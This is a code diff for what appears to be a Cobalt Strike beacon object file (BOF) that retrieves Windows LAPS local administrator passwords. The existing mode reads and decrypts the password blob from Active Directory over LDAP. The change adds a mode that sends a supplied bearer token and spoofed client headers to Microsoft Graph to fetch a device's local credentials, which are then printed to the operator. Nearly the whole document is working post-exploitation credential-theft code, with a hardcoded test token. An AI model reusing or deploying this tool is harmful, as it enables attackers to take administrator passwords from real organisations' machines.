@@ -7,9 +7,10 @@
 #include <ncryptprotect.h>
 #include <sddl.h>
 #include <Winldap.h>
+#include <winhttp.h>
 #include "base\helpers.h"
 
-#define PROGVERS "1.3.1"
+#define PROGVERS "1.4.0"
 #ifdef _DEBUG
 #include "base\mock.h"
 #undef DECLSPEC_IMPORT
@@ -20,12 +21,52 @@ extern "C" {
 
 #include "beacon.h"
 
+    #define ARRLEN(arr) (sizeof(arr) / sizeof(arr[0]))
+
+    DFR(MSVCRT, malloc);
+    DFR(MSVCRT, sprintf);
+    DFR(MSVCRT, _swprintf);      
+    DFR(MSVCRT, free);
+    DFR(KERNEL32, GetLastError);
+    #define malloc MSVCRT$malloc
+    #define sprintf MSVCRT$sprintf
+    #define _swprintf MSVCRT$_swprintf
+    #define free MSVCRT$free
+    #define GetLastError KERNEL32$GetLastError
+
     struct blob_header {
         unsigned int upperdate;
         unsigned int lowerdate;
         unsigned int encryptedBufferSize;
         unsigned int flags;
     };
+
+    size_t wcslen(const wchar_t* str) {
+        size_t len = 0;
+        while (*str != L'\0') {
+            len++;
+            str++;
+        }
+
+        return len;
+    }
+
+    size_t strlen(const char* str) {
+        size_t len = 0;
+        while (*str != '\0') {
+            len++;
+            str++;
+        }
+        return len;
+    }
+
+    int strcmp(const char *str1, const char *str2) {
+        while (*str1 && (*str1 == *str2)) {
+            str1++;
+            str2++;
+        }
+        return *(unsigned char*)str1 - *(unsigned char*)str2;
+    }
 
     bool searchLdap(PSTR ldapServer, ULONG port, PCHAR distinguishedName, PCHAR searchFilter, char **output, int* length, char** output2, int* length2) {
 
@@ -36,7 +77,6 @@ extern "C" {
         DFR_LOCAL(wldap32, ldap_count_entries);
         DFR_LOCAL(wldap32, ldap_first_entry);
         DFR_LOCAL(wldap32, ldap_get_values_lenA);
-        DFR_LOCAL(wldap32, ldap_get_values);
         DFR_LOCAL(wldap32, ldap_msgfree);
 
         LDAP *ldapHandle;
@@ -62,10 +102,7 @@ extern "C" {
             
         if (ldap_search_s(ldapHandle, distinguishedName, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult) != LDAP_SUCCESS) {
             
-            if (searchResult != NULL)
-                ldap_msgfree(searchResult);
-                
-                return false;
+            if (searchResult != NULL) ldap_msgfree(searchResult);
 
             BeaconPrintf(CALLBACK_ERROR, "Error Using LDAP connection: ldap_search_s");
             ldap_unbind(ldapHandle);
@@ -75,8 +112,7 @@ extern "C" {
         entryCount = ldap_count_entries(ldapHandle, searchResult);
         if (entryCount == 0) {
 
-            if (searchResult != NULL)
-                ldap_msgfree(searchResult);
+            if (searchResult != NULL) ldap_msgfree(searchResult);
 
             BeaconPrintf(CALLBACK_ERROR, "0 results found from LDAP");
             return false;
@@ -85,8 +121,7 @@ extern "C" {
         firstEntry = ldap_first_entry(ldapHandle, searchResult);
         if (firstEntry == NULL) {
 
-            if (searchResult != NULL)
-                ldap_msgfree(searchResult);
+            if (searchResult != NULL) ldap_msgfree(searchResult);
 
             BeaconPrintf(CALLBACK_ERROR, "Error ldap_first_entry");
             ldap_unbind(ldapHandle);
@@ -97,8 +132,7 @@ extern "C" {
         
         if (outval == NULL) {
 
-            if (searchResult != NULL)
-                ldap_msgfree(searchResult);
+            if (searchResult != NULL) ldap_msgfree(searchResult);
 
             //TODO: ChatGPT Safety note  
             // ldap_msgfree is only for LDAPMessage* chains like searchResult. firstEntry is just a pointer inside that chain. Do not free it separately.
@@ -113,8 +147,7 @@ extern "C" {
         outval1 = ldap_get_values_lenA(ldapHandle, firstEntry, attr[1]);
         if (outval1 == NULL) {
 
-            if (searchResult != NULL)
-                ldap_msgfree(searchResult);
+            if (searchResult != NULL) ldap_msgfree(searchResult);
             
             //TODO: ChatGPT Safety note
             //Problem: ldap_msgfree is only for LDAPMessage* chains like searchResult. firstEntry is just a pointer inside that chain. Do not free it separately.
@@ -153,9 +186,7 @@ extern "C" {
         ULONGLONG ullTime;
         PCHAR sADTime = (PCHAR) vRawTimestamp;
         DFR_LOCAL(KERNEL32, FileTimeToSystemTime);
-        DFR_LOCAL(MSVCRT, sprintf);
         DFR_LOCAL(MSVCRT, _strtoi64);
-        DFR_LOCAL(MSVCRT, malloc);
 
         buf = (CHAR*)malloc(64 * sizeof(CHAR));
         // Expect timestamp from AD should be 18 characters. If not something wrong, spec changed, or possibly it's in a different metric unit. Bail.
@@ -199,8 +230,6 @@ extern "C" {
         FILETIME ft;
         SYSTEMTIME stUTC;
         DFR_LOCAL(KERNEL32, FileTimeToSystemTime);
-        DFR_LOCAL(MSVCRT, sprintf);
-        DFR_LOCAL(MSVCRT, malloc);
 
         ft.dwLowDateTime = dwLowDateTime;
         ft.dwHighDateTime =  dwHighDateTime;
@@ -220,7 +249,7 @@ extern "C" {
 
     WCHAR* RemoveSIDPrefix(WCHAR* ss) {
         
-        DFR_LOCAL(MSVCRT, wcslen);
+        
         DFR_LOCAL(KERNEL32, LocalFree);
 
         static WCHAR buf[256];
@@ -263,9 +292,6 @@ extern "C" {
         DWORD domainSize = sizeof(domain);
 
         DFR_LOCAL(KERNEL32, LocalFree);
-        DFR_LOCAL(MSVCRT, malloc);
-        DFR_LOCAL(MSVCRT, _swprintf);
-        DFR_LOCAL(KERNEL32, GetLastError);
         DFR_LOCAL(ADVAPI32, ConvertStringSidToSidW);
         DFR_LOCAL(ADVAPI32, LookupAccountSidW);
         
@@ -287,7 +313,6 @@ extern "C" {
 
         ntacct = (WCHAR*)malloc(256 * sizeof(WCHAR));
         _swprintf((WCHAR*) ntacct, L" %ls\\%ls\n", domain, name);
-        // Clean up
         LocalFree(pSid);
 
         return (WCHAR*)ntacct;
@@ -373,14 +398,137 @@ extern "C" {
         return true;
     }
 
+    void doLAPSEntra(const char* authtoken, const char* device_id) {
+
+        DFR_LOCAL(WINHTTP, WinHttpOpen);
+        DFR_LOCAL(WINHTTP, WinHttpConnect);
+        DFR_LOCAL(WINHTTP, WinHttpOpenRequest);
+        DFR_LOCAL(WINHTTP, WinHttpAddRequestHeaders);
+        DFR_LOCAL(WINHTTP, WinHttpSendRequest);
+        DFR_LOCAL(WINHTTP, WinHttpReceiveResponse);
+        DFR_LOCAL(WINHTTP, WinHttpReadData);
+        DFR_LOCAL(WINHTTP, WinHttpCloseHandle);
+
+        const wchar_t * dlc_endpoint = L"/v1.0/directory/deviceLocalCredentials/%ls?$select=credentials";
+        wchar_t craftedurl[400] = { 0 };
+        char* respBuff = (char*)malloc(55000);
+        wchar_t* devid = NULL;
+        wchar_t* authbear = NULL;
+        wchar_t* authhdr = NULL;
+        DWORD dataRead = 0;
+
+        #ifdef DEBUGTEST
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Utilizng Fake Token and Device");
+        devid = L"7a4b0435-b1a1-4788-9f04-7215c5ec8ee1";
+        authbear = L"rSlWY2-LWNLvRUyJn5fKQn2KhfpuEPyXOqih9XB0OqyfAaxMdSybe2SUp919o1sqv6cEt8l8hBLVHIlDA4YauZx-4VApIn4sKWN64hvikILoeQ";
+        #else
+        authbear = (wchar_t*)malloc((strlen(authtoken) + 1) * sizeof(wchar_t));
+        toWideChar((char*) authtoken, authbear, (((strlen(authtoken) + 1) * sizeof(wchar_t) )));
+        devid = (wchar_t*)malloc(73 * sizeof(wchar_t));
+        toWideChar((char*) device_id, devid, (((strlen(device_id) + 1) * sizeof(wchar_t) )));
+        #endif
+
+        authhdr = (wchar_t *)malloc((wcslen(authbear) + wcslen(L"Authorization: Bearer ") + 1) * sizeof(wchar_t));
+
+        _swprintf(authhdr, L"Authorization: Bearer %ls", authbear);
+        _swprintf(craftedurl, dlc_endpoint, devid);
+
+        #ifdef DEBUGTEST
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Authorization Header is : %ls", authhdr);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Crafted Graph Endpoint URL: %ls", craftedurl);
+        #endif
+
+        if (!respBuff) {
+            BeaconPrintf(CALLBACK_ERROR, "Failed allocation for Response buffer.\n");
+            return;
+        }
+
+        // Open session
+        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", 
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
+            NULL, 
+            WINHTTP_NO_PROXY_BYPASS, 
+            0);
+
+        if (!hSession) {
+            BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed: %u\n", GetLastError());
+            //BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed.\n");
+            return;
+        }
+
+        // Connect
+        HINTERNET hConnect = WinHttpConnect(hSession, L"graph.microsoft.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (!hConnect) {
+            BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed: %u\n", GetLastError());
+            //BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed.");
+            WinHttpCloseHandle(hSession);
+            return;
+        }
+
+        // WinHTTP To Send Request
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", craftedurl, 
+            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (!hRequest) {
+
+            BeaconPrintf(CALLBACK_ERROR, "WinHttpOpenRequest failed: %u\n", GetLastError());
+            //BeaconPrintf(CALLBACK_ERROR, "WinHttpOpenRequest failed.");
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            return;
+        }
+
+        // Add headers
+        WinHttpAddRequestHeaders(hRequest, L"x-client-SKU: MSAL.CoreCLR\r\nocp-client-version: 10.0.26100\r\nocp-client-name: Windows\r\n", 
+            -1L, WINHTTP_ADDREQ_FLAG_ADD);
+        WinHttpAddRequestHeaders(hRequest, authhdr, -1L, WINHTTP_ADDREQ_FLAG_ADD);
+
+        // Send request
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
+            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+            BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed: %u\n", GetLastError());
+            //BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed.");
+        }
+
+        // Receive response
+        if (!WinHttpReceiveResponse(hRequest, NULL)) {
+            BeaconPrintf(CALLBACK_ERROR, "WinHttpReceiveResponse failed: %u\n", GetLastError());
+            //BeaconPrintf(CALLBACK_ERROR, "WinHttpReceiveResponse failed.");
+        }
+
+        // Read response chunks
+        BOOL bResults = TRUE;
+        DWORD totalRead = 0;
+        do {
+            dataRead = 0;
+            bResults = WinHttpReadData(hRequest, (LPVOID)(respBuff + totalRead), 55000 - totalRead, &dataRead);
+            totalRead += dataRead;
+        } while (bResults && dataRead > 0);
+
+        // Output
+        respBuff[totalRead] = '\0';
+        BeaconPrintf(CALLBACK_OUTPUT, "MSGraph Response: %s", respBuff);
+
+        // Cleanup
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+        if (respBuff) free(respBuff);
+        if (devid) free(devid);
+        if (authbear) free(authbear);
+        if (authhdr) free(authhdr);
+
+    }
+
     void go(char* args, int len) {
+
         unsigned char *output, *output2;
         int length, length2;
         struct blob_header* header;
         datap  parser;
-
-        DFR_LOCAL(MSVCRT, sprintf);
         
+        char* lapsmode;
+        char* authtoken;
+        char* device_id;
         char* domainController;
         char* distinguishedName;
         char* rootDN;
@@ -388,31 +536,52 @@ extern "C" {
         int stringSize = 0;
 
         BeaconDataParse(&parser, args, len);
+        lapsmode = BeaconDataExtract(&parser, NULL);
 
-        domainController = BeaconDataExtract(&parser, NULL);
-        rootDN = BeaconDataExtract(&parser, NULL);
-        distinguishedName = BeaconDataExtract(&parser, &stringSize);
 
-        if (stringSize > sizeof(ldapSearch) - 45) {
-            // Don't want an accidental overflow crashing the BOF
-            ldapSearch[1024 - 45] = '\0';
+        if (strcmp("AZLAPS", lapsmode) == 0) {
+
+            //AZURE (aka ENTRA) AD MODE   
+            authtoken = BeaconDataExtract(&parser, NULL);
+            device_id = BeaconDataExtract(&parser, &stringSize);
+            doLAPSEntra(authtoken, device_id);
+        }
+        else if (strcmp("ADLAPS", lapsmode) == 0 ) {
+
+            //AD ON-PREM MODE     
+            domainController = BeaconDataExtract(&parser, NULL);
+            rootDN = BeaconDataExtract(&parser, NULL);
+            distinguishedName = BeaconDataExtract(&parser, &stringSize);
+
+            if (stringSize > sizeof(ldapSearch) - 45) {
+            //Don't want an accidental overflow crashing the BOF
+                ldapSearch[1024 - 45] = '\0';
+            }
+
+            sprintf(ldapSearch, "(&(objectClass=computer)(distinguishedName=%s))", distinguishedName);
+            if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length, (char**)&output2, &length2)) {
+                return;
+            }
+
+            header = (struct blob_header*)output;
+            BeaconPrintf(CALLBACK_OUTPUT, "=== LAPSv2 Account Information ===:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nPassword Expiry Date: %s \nPassword Last Update: %s\nEncrypted Buffer Size: %d\nFlags: %d\n", header->upperdate, header->lowerdate, ConvertADTimestampToHumanTime(output2, length2), ConvertWinFileTimeToHumanTime(header->lowerdate, header->upperdate), header->encryptedBufferSize, header->flags);
+            if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
+                BeaconPrintf(CALLBACK_ERROR, "Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail", header->encryptedBufferSize, length-sizeof(blob_header));
+            }
+
+            if (!unprotectSecret((BYTE*)output, length)) {
+                BeaconPrintf(CALLBACK_ERROR, "Could not unprotect LAPS creds");
+                return;
+            }
+        }
+        else {
+                // Sohuld not be reachable because of the CS CNA script checks.
+                BeaconPrintf(CALLBACK_ERROR, "BOF_EXEC_ERROR: UNKNOWN AD MODE"); 
+                return;
         }
 
-        sprintf(ldapSearch, "(&(objectClass=computer)(distinguishedName=%s))", distinguishedName);
-        if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length, (char**)&output2, &length2)) {
-            return;
-        }
 
-        header = (struct blob_header*)output;
-        BeaconPrintf(CALLBACK_OUTPUT, "=== LAPSv2 Account Information ===:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nPassword Expiry Date: %s \nPassword Last Update: %s\nEncrypted Buffer Size: %d\nFlags: %d\n", header->upperdate, header->lowerdate, ConvertADTimestampToHumanTime(output2, length2), ConvertWinFileTimeToHumanTime(header->lowerdate, header->upperdate), header->encryptedBufferSize, header->flags);
-        if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
-            BeaconPrintf(CALLBACK_ERROR, "Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail", header->encryptedBufferSize, length-sizeof(blob_header));
-        }
-
-        if (!unprotectSecret((BYTE*)output, length)) {
-            BeaconPrintf(CALLBACK_ERROR, "Could not unprotect LAPS creds");
-            return;
-        }
+        
     }
 }
 #
